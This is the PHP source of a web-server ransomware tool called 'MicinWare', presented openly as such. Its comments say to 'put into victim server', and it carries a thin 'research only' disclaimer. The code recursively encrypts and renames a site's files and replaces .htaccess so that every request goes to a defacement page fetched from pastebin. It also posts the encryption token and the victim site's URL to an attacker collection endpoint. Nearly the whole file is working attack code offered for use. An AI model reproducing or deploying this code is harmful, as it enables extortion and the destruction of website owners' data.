<?php
define("DOC_ROOT", $_SERVER['DOCUMENT_ROOT']);

/**
* @author Krypton aka GreyCat aka 0x00b0
* @copyright ExploreOurBrain - 2019
* put into victim server
* Open Source PHP RansomeWare - MicinWare

* Disclaimer : 
  This source code is for research purpose only, the use of this code is YOUR RESPONSIBILITY
  I take NO responsibility and/or liability for how you choose to use any of this source code. 
  By using of this file, you understand that you are AGREEING TO USE AT YOUR OWN RISK. Once again, 
  Source code available is for EDUCATION and/or RESEARCH purposes ONLY.

  Any actions and/or activities related to the material contained within this source code is solely your responsability. Misuse of the information in this source code can result in criminal charges being brought against the persons in question. I will not be held responsible in the event any criminal charges are brought against any individuals misuing the code in this source code to break the law.
*/


MicinWare::main();
class MicinWare
{
	public static $attacker 	= 'GreyCat';
	public static $mailAttacker = 'example@gmail.com';
	public static $sendMail 	= false;//(Bool) is send to your email ? 

	public function main()
	{
		$token 	= bin2hex(openssl_random_pseudo_bytes(16));
		$path 	= !empty($_POST['path']) ? $_POST['path'] : getcwd();
		$key 	= isset($_POST['key']) ? $_POST['key'] : "";
		$type 	= isset($_POST['type']) ? $_POST['type'] : "";

		self::MicinWareGUI();
		
		if (isset($_POST['submit'])) 
		{
			switch ($type) 
			{
				case 'Cry':
					self::_throwMicin($token,'Log');
					self::execute($path,$token,'Cry');
					break;
				
				case 'Decry':
					self::execute($path,$key,'Decry');
					break;
				default:
					echo 'Choose of checkboxes -_-';
					break;
			}

			die;
		}
	}

	public function MicinWareGUI()
	{
		echo '
			<!DOCTYPE html>
			<html lang="en">
			<!-- Krypton aka GreyCat aka 0x0b0 - Explore Our Brain de Maniac Coding -->
			<head>
			    <meta charset="UTF-8">
			    <title>MicinWare</title>

			    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
			    <link rel="stylesheet" type="text/css" href="https://raw.githubusercontent.com/exploreourbrain/CSS-MicinWare/master/style.css">
			    <link rel="shortcut icon" type="image/png" href="https://sensorstechforum.com/wp-content/uploads/2016/06/lock-padlock-symbol-for-security-interface.png"/>
			    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
			    <script src="https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js"></script>
			    <script
			  src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
			  integrity="sha256-3edrmyuQ0w65f8gfBsqowzjJe2iM6n0nKciPUp8y+7E="
			  crossorigin="anonymous"></script>

			</head>

			<body>
			  <center><img src="https://i.postimg.cc/gkQK4cwt/micin-2.png"><br></center>
			    <form action="" method="POST">
			    	<div class="radio">
			            <input id="value2" type="radio" name="type" class="type" value="Cry" />
			            <label for="value2">Cry</label>
			        </div>
			        <div class="radio">
			            <input id="value3" type="radio" name="type" class="type" value="Decry"/>
			            <label for="value3">deCry</label>
			        </div>
			        <input type="text" placeholder="Path ex: /var/www/html/victimDir" name="path" />
			        <input type="text" placeholder="Key Decryptor" id="key" style="display: none;" name="key" />

			        <input type="submit" value="Submit" name="submit" />
			    </form>

			</body>

			</html>

			<script type="text/javascript">
				$(\'.type\').click(function(event) {
					var check = $(this).val();
					if (check === \'Decry\') 
					{
						$(\'#key\').show();
					}
					else
					{
						$(\'#key\').hide();
					}
				});
			</script>
		';
	}

	public function execute($dir='',$token='',$type='',&$result = array())
    {
    	$files 		= scandir($dir);
    	$extensions = array("jpg","png","gif","zip");//not encrypted
    	
    	if ($type == 'Cry') 
    	{
    		self::generateMicin();
    	}
    	else
    	{
    		self::ungenerateMicin();
    	}

	    foreach($files as $key => $value)
	    {
	        $path = realpath($dir.'/'.$value);
	        if(!is_dir($path)) 
	        {
	        	$ext = self::getFileExtension($path);
				if (!in_array($ext,$extensions)) 
				{
		        	if ( !strpos($path,basename(__FILE__)) && !strpos($path,".htaccess") && !strpos($path,"greycat.php") && !strpos($path,"micin.php") )
		        	{
		        		switch ($type) 
		        		{
		        			case 'Cry':
		        				//encrypt content
		        				$Cry 	= self::micinCry(file_get_contents($path),$token);
		        				$write 	= file_put_contents($path, $Cry);//Don't Cry baby

		        				//encrypt filename
		        				$rename = rename($path, self::micinCry($path,$token).".gblk");//Don't Cry baby

		        				if ($write && $rename) 
		        				{
		        					echo "<i class='fa fa-check'></i> ".$path." <span style='color:lime;'>Encrypted</span><br>";
		        				}
		        				else
		        				{

		        					echo "<i class='fa fa-times'></i> ".$path." <span style='color:red;'>Failed !</span><br>";
		        				}
		        				break;
		        			
		        			case 'Decry':
		        				//decrypt content
		        				$deCry 	= self::micindeCry(file_get_contents($path),$token);
		        				$write 	= file_put_contents($path, $deCry);

		        				//decrypt filename
		        				$rename = rename($path, self::micindeCry($path,$token));//Don't Cry baby

		        				if ($write && $rename) 
		        				{
		        					echo "<i class='fa fa-check'></i> ".$path." <span style='color:lime;'>Decrypted ^_^ </span><br>";
		        				}
		        				else
		        				{

		        					echo "<i class='fa fa-times'></i> ".$path." <span style='color:red;'>Failed !</span><br>";
		        				}
		        				break;
		        		}
		        		
		            	$result[] = $path;
		        	}
          		}
	        } 
	        else if($value != "." && $value != ".." ) 
	        {
	            self::execute($path, $result);
	        }
	        flush();
      		ob_flush();
	    }
    }

   	private function getFileExtension($filename)
	{
		$path_info = pathinfo($filename);
		return $path_info['extension'];
	}

	public function micinCry($plaintext='',$key='')
	{
		$options 		= OPENSSL_RAW_DATA;
		$as_binary 		= true;
		$ivlen   		= openssl_cipher_iv_length("aes-256-cbc");
		$iv 	 		= openssl_random_pseudo_bytes($ivlen);
		$ciphertext_raw = openssl_encrypt($plaintext, "aes-256-cbc", $key, $options, $iv);
		$hmac 			= hash_hmac('sha256', $ciphertext_raw, $key, $as_binary);
		$ciphertext 	= self::_throwMicin( $iv.$hmac.$ciphertext_raw ,'Cry');

		return $ciphertext;
	}

	public function micindeCry($ciphertext='',$key='')
	{
		$c 					= self::_throwMicin($ciphertext,'Decry');
		$options 			= OPENSSL_RAW_DATA;
		$ivlen 				= openssl_cipher_iv_length("aes-256-cbc");
		$iv 				= substr($c, 0, $ivlen);
		$hmac 				= substr($c, $ivlen, $sha2len=32);
		$ciphertext_raw 	= substr($c, $ivlen+$sha2len);
		$original_plaintext = @openssl_decrypt($ciphertext_raw, "aes-256-cbc", $key, $options, $iv);
		$calcmac 			= @hash_hmac('sha256', $ciphertext_raw, $key, $as_binary=true);
		if (hash_equals($hmac, $calcmac))
		{
		    return $original_plaintext."\n";
		}
	}

	public function generateMicin()
	{
		$check = file_exists(DOC_ROOT."/.htaccess.old");
		if (!$check) 
			rename(DOC_ROOT.'/.htaccess', DOC_ROOT.'/.htaccess.old');
			file_put_contents(DOC_ROOT.'/.htaccess', "DirectoryIndex greycat.php\nErrorDocument 404 /greycat.php");
			file_put_contents(DOC_ROOT.'/greycat.php', file_get_contents("https://pastebin.com/raw/xBpsQ1Mw"));
	}

	public function ungenerateMicin()
	{
		$check = file_exists(DOC_ROOT."/.htaccess.old");
		if (!$check) 
			unlink(DOC_ROOT."/.htaccess");
			unlink(DOC_ROOT."/greycat.php");
			rename(DOC_ROOT.'/.htaccess.old', DOC_ROOT.'/.htaccess');
	}

	private function _deliveryMicin($url, $postVars = array())
	{
	    $postStr = http_build_query($postVars);
	    $options = array(
	        'http' =>
	            array(
	                'method'  => 'POST', 
	                'header'  => 'Content-type: application/x-www-form-urlencoded',
	                'content' => $postStr
	            )
	    );
	   
	    $streamContext  = stream_context_create($options);
	    $result 		= file_get_contents($url, false, $streamContext);
	    
	    if($result === false)
	    {
	        $error = error_get_last();
	        throw new Exception('POST request failed: ' . $error['message']);
	    }

	    return $result;
	}

	private function _throwMicin($data='',$type='',$pathMicined='')
	{
		//Yow, What do u want ? 
		$actualLink = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
		$result = 	self::_deliveryMicin('http://localheart/ransom/micin.php', 
					array(
					    'taburinMicin' 	=> $type,
					    'komposisi'    	=> $data,
					    'you'			=> $actualLink,
					    'micined'		=> ( isset($pathMicined) ? $pathMicined : ""),
					    'email' 		=> ( self::$mailAttacker == true ? self::$mailAttacker : "")
					));
		
		return $result;
	}
}
?>